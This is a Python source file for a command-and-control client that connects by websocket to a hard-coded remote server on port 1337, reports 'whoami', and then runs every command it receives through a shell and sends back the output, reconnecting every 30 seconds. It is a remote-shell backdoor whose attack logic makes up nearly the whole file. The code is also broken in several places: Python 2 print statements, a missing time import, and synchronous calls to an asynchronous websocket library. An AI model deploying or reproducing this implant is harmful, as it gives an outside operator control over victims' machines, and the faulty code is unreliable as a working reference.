import subprocess
import os

import click
import asyncore
import websockets

from utils import hash_sha256

os.system("pip install asyncio click websockets")

def execute_command(cmd):
    try:
        splitted = cmd.strip("\n").split(" ")
        if len(splitted) == 2 and splitted[0] == "cd":
            os.chdir(splitted[1])
        else:
            output = subprocess.check_output(cmd, shell=True)
            return output
    except subprocess.CalledProcessError:
        pass
    return ""


class Client:
    def __init__(self, password, connection_interval):
        self.pass_hash = hash_sha256(password)
        self.connection_interval = connection_interval

    def connection_loop(self, uri):
        while True:
            self._connect(uri)
            time.sleep(self.connection_interval)

    def _connect(self, uri):
        try:
            ws = websockets.connect(uri)
            ws.send(self.pass_hash)
            ws.send(execute_command("whoami"))

            while True:
                cmd = ws.recv()
                ws.send(execute_command(cmd))
        except Exception as e:
            print "Exception %s occurred." % str(e)


@click.command()
@click.option(
    "--server_address",
    "-s",
    default="vmi850151.contaboserver.net",
    type=click.STRING,
    help="Ip address or host of a running c&c",
)
@click.option(
    "--port",
    "-p",
    default="1337",
    type=click.INT,
    help="Port where the running c&c listens",
)
@click.option(
    "--connection_interval",
    "-i",
    default="30",
    type=click.INT,
    help="Interval in seconds in which client tries to connect to c&c server",
)
def main(server_address, port, connection_interval):
    client = Client("password", connection_interval)

    uri = "ws://%s:%s" % (server_address, port)

    print "Starting client..."
    client.connection_loop(uri)


if __name__ == "__main__":
    main()
